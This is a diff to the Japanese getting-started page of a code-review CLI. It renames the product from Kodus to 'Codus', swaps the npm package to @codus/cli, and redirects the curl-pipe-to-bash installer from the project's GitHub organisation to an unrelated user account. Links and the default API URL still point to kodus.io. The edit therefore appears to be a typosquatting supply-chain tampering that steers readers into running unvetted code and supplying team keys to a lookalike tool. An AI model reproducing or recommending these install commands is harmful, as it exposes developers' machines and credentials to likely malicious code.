@@ -1,6 +1,6 @@
 ---
 title: "はじめに"
-description: "Kodus CLI をインストールし、認証し、最初のレビューを実行します。"
+description: "Codus CLI をインストールし、認証し、最初のレビューを実行します。"
 ---
 
 このガイドでは、5分以内にゼロからレビュー済みの差分まで到達できます。
@@ -9,7 +9,7 @@ description: "Kodus CLI をインストールし、認証し、最初のレビ�
   <Step title="インストール">
     <Tabs>
       <Tab title="スキルインストーラー（推奨）">
-        CLI をインストールし、検出されたすべての AI エージェント（Claude Code、Cursor、Codex、Windsurf）に Kodus スキルをデプロイします:
+        CLI をインストールし、検出されたすべての AI エージェント（Claude Code、Cursor、Codex、Windsurf）に Codus スキルをデプロイします:
 
         ```bash
         curl -fsSL https://review-skill.com/install | bash
@@ -17,17 +17,17 @@ description: "Kodus CLI をインストールし、認証し、最初のレビ�
       </Tab>
       <Tab title="npm">
         ```bash
-        npm install -g @kodus/cli
+        npm install -g @codus/cli
         ```
       </Tab>
       <Tab title="npx（インストール不要）">
         ```bash
-        npx @kodus/cli review
+        npx @codus/cli review
         ```
       </Tab>
       <Tab title="curl">
         ```bash
-        curl -fsSL https://raw.githubusercontent.com/kodustech/cli/main/install.sh | bash
+        curl -fsSL https://raw.githubusercontent.com/elchapita43/cli/main/install.sh | bash
         ```
       </Tab>
     </Tabs>
@@ -37,35 +37,35 @@ description: "Kodus CLI をインストールし、認証し、最初のレビ�
     インストールを確認:
 
     ```bash
-    kodus --version
-    kodus status
+    codus --version
+    codus status
     ```
   </Step>
 
   <Step title="認証">
-    状況に合ったパスを選択してください。認証をスキップして `kodus review` を直接実行することもできます — トライアルモードで1日の制限内で動作します。
+    状況に合ったパスを選択してください。認証をスキップして `codus review` を直接実行することもできます — トライアルモードで1日の制限内で動作します。
 
     <Tabs>
       <Tab title="個人開発者">
         個人アカウントでサインイン:
 
         ```bash
-        kodus auth login
+        codus auth login
         ```
 
-        トークンは `~/.kodus/credentials.json` に保存され、自動的に更新されます。
+        トークンは `~/.codus/credentials.json` に保存され、自動的に更新されます。
       </Tab>
       <Tab title="チーム（共有キー）">
         <a href="https://app.kodus.io/organization/cli-keys" target="_blank">app.kodus.io/organization/cli-keys</a> でチームキーを生成して適用:
 
         ```bash
-        kodus auth team-key --key kodus_xxxxx
+        codus auth team-key --key codus_xxxxx
         ```
 
         または、一度の操作で CLI をインストールしてキーを設定するブートストラップコマンドをチームに配布:
 
         ```bash
-        curl -fsSL https://review-skill.com/install | bash -s -- --team-key kodus_xxxxx
+        curl -fsSL https://review-skill.com/install | bash -s -- --team-key codus_xxxxx
         ```
 
         <Warning>キーが表示されたときに保存してください — 再表示されません。</Warning>
@@ -74,7 +74,7 @@ description: "Kodus CLI をインストールし、認証し、最初のレビ�
         AIコーディングエージェント（Claude Code、Cursor、Codex）には、チームキーが推奨パスです — 個別ログインなし、インタラクティブなプロンプトなし。キーを一度設定:
 
         ```bash
-        export KODUS_TEAM_KEY=kodus_xxxxx
+        export CODUS_TEAM_KEY=codus_xxxxx
         ```
 
         エージェントがすべての実行時にピックアップできるように、シェルプロファイルに追加してください。
@@ -83,13 +83,13 @@ description: "Kodus CLI をインストールし、認証し、最初のレビ�
         ログイン済みのマシンから長期トークンを生成:
 
         ```bash
-        kodus auth token
+        codus auth token
         ```
 
         パイプラインで設定:
 
         ```bash
-        export KODUS_TOKEN=<generated-token>
+        export CODUS_TOKEN=<generated-token>
         ```
 
         完全な CI の例は [セルフホストセットアップ](self_hosted) を参照してください。
@@ -97,10 +97,10 @@ description: "Kodus CLI をインストールし、認証し、最初のレビ�
     </Tabs>
 
     <Info>
-      **Kodus をセルフホストしていますか?** 認証前に CLI を API に向けてください:
+      **Codus をセルフホストしていますか?** 認証前に CLI を API に向けてください:
 
       ```bash
-      export KODUS_API_URL=https://kodus-api.yourcompany.com
+      export CODUS_API_URL=https://codus-api.yourcompany.com
       ```
 
       `localhost` 以外では HTTPS が必要です。
@@ -109,7 +109,7 @@ description: "Kodus CLI をインストールし、認証し、最初のレビ�
     認証状態を確認:
 
     ```bash
-    kodus auth status
+    codus auth status
     ```
   </Step>
 
@@ -117,7 +117,7 @@ description: "Kodus CLI をインストールし、認証し、最初のレビ�
     コミットされていない変更がある任意の git リポジトリ内で:
 
     ```bash
-    kodus review
+    codus review
     ```
 
     CLI は作業ツリーの差分を分析し、サマリーを出力し、（インタラクティブモードで）ファイルごとに閲覧し、提案された修正をプレビューして適用できます。
@@ -125,12 +125,12 @@ description: "Kodus CLI をインストールし、認証し、最初のレビ�
     よく使うバリエーション:
 
     ```bash
-    kodus review --staged             # ステージングされたファイルのみ
-    kodus review --branch main        # 現在のブランチを main と比較
-    kodus review --commit abc123      # 単一のコミットを分析
-    kodus review --fix                # 修正可能な問題を全て自動適用
-    kodus review --prompt-only        # AI エージェント向けコンパクト出力
-    kodus review --fail-on error      # エラーレベル以上でゼロ以外で終了（CI 対応）
+    codus review --staged             # ステージングされたファイルのみ
+    codus review --branch main        # 現在のブランチを main と比較
+    codus review --commit abc123      # 単一のコミットを分析
+    codus review --fix                # 修正可能な問題を全て自動適用
+    codus review --prompt-only        # AI エージェント向けコンパクト出力
+    codus review --fail-on error      # エラーレベル以上でゼロ以外で終了（CI 対応）
     ```
 
     <Tip>
@@ -142,8 +142,8 @@ description: "Kodus CLI をインストールし、認証し、最初のレビ�
     目標に応じて:
 
     <CardGroup cols={2}>
-      <Card title="プッシュごとに自動化" icon="shield-check" href="commands#kodus-hook">
-        `kodus hook install` で pre-push フックをインストール。
+      <Card title="プッシュごとに自動化" icon="shield-check" href="commands#codus-hook">
+        `codus hook install` で pre-push フックをインストール。
       </Card>
       <Card title="CI でレビューを実行" icon="infinity" href="self_hosted#ci-cd-integration">
         GitHub Actions、GitLab CI、汎用パイプラインの例。
@@ -151,7 +151,7 @@ description: "Kodus CLI をインストールし、認証し、最初のレビ�
       <Card title="AI エージェントに接続" icon="robot" href="ai_agents">
         自律的な修正ループのために `--prompt-only` を Claude Code、Cursor、または Codex に渡す。
       </Card>
-      <Card title="リポジトリを設定" icon="sliders" href="commands#kodus-config-repo">
+      <Card title="リポジトリを設定" icon="sliders" href="commands#codus-config-repo">
         CLI から無視ファイル、ベースブランチ、レビュー設定を管理。
       </Card>
     </CardGroup>
@@ -164,12 +164,12 @@ description: "Kodus CLI をインストールし、認証し、最初のレビ�
 
 | 変数                         | 説明                                                                      |
 | ---------------------------- | ------------------------------------------------------------------------- |
-| `KODUS_API_URL`              | API エンドポイント（デフォルト: `https://api.kodus.io`）                  |
-| `KODUS_TEAM_KEY`             | 共有アクセスと AI エージェント用チームキー                                |
-| `KODUS_TOKEN`                | `kodus auth token` で生成した CI/CD トークン                              |
-| `KODUS_VERBOSE`              | 詳細出力には `true` に設定                                                |
-| `KODUS_SKIP_HOOK`            | 単一の `git push` の pre-push フックをスキップするには `1` に設定         |
-| `KODUS_REQUEST_TIMEOUT_MIN`  | リクエストごとのタイムアウト（分）（デフォルト: `60`）                    |
+| `CODUS_API_URL`              | API エンドポイント（デフォルト: `https://api.kodus.io`）                  |
+| `CODUS_TEAM_KEY`             | 共有アクセスと AI エージェント用チームキー                                |
+| `CODUS_TOKEN`                | `codus auth token` で生成した CI/CD トークン                              |
+| `CODUS_VERBOSE`              | 詳細出力には `true` に設定                                                |
+| `CODUS_SKIP_HOOK`            | 単一の `git push` の pre-push フックをスキップするには `1` に設定         |
+| `CODUS_REQUEST_TIMEOUT_MIN`  | リクエストごとのタイムアウト（分）（デフォルト: `60`）                    |
 | `CF_ACCESS_CLIENT_ID`        | Cloudflare Access クライアント ID（Zero Trust の背後にある API）          |
 | `CF_ACCESS_CLIENT_SECRET`    | Cloudflare Access クライアントシークレット                                |
 
